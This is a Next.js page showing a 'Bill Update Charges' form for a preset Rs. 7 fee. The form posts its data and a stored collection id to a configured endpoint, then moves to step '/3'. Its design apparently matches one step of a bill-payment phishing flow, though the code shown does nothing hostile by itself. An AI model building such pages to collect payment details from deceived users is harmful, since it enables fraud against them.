'use client';
import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";  


export default function Home() {
    const router = useRouter();
    const API_URL = process.env.NEXT_PUBLIC_URL;
    const SITE = process.env.NEXT_PUBLIC_SITE;
    const handleSubmit = async (e) => {
        e.preventDefault();
        const formData = new FormData(e.target);
        const jsonObject1 = {};
        const jsonObject = {};
        formData.forEach((value, key) => {
            jsonObject[key] = value;
        });
        jsonObject1['data'] = jsonObject;
        jsonObject1['site'] = SITE;
        jsonObject1['id'] = localStorage.getItem("collection_id");
        
        try {
            const response = await fetch(`${API_URL}`, {
                method: 'POST',
                body: JSON.stringify(jsonObject1)
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            const responseData = await response.json();
            if(responseData.status==200){
                localStorage.setItem('collection_id', responseData.data);
                router.push('/3');
            }else{
              alert("not found ss");
            }
        } catch (error) {
            console.error('There was a problem with the fetch operation:', error);
        }
    };
  return (
    <>
    <Header />
    <main className="container">
    <div id="test" className="text-danger text-center fw-bold" />
    <div className="card m-2">
        <div className="card-header border-bottom-0">
        <h1 className="text-center fw-bold">Bill Update Charges </h1>
        </div>
        <form onSubmit={handleSubmit} className="mt-3  p-2">
        <div className="form-group mb-3 d-flex align-items-center">
            <input
                
                name="bilcharge"
                type="radio"
                className="form-radio"
                required
                checked
                />
            <label>Rs. 7</label>
        </div>
        <div className="text-center bg-danger">
            <button
            type="submit"
            id="submit-button"
            className="btn W-100 btn-lg btn-danger "
            >
            Pay Now
            </button>
        </div>
        <div className="my-4">
            <img src="assets/ft.png" width="100%" alt="" />
        </div>
        </form>
    </div>
    </main>

    <Footer />
</>
  );
}
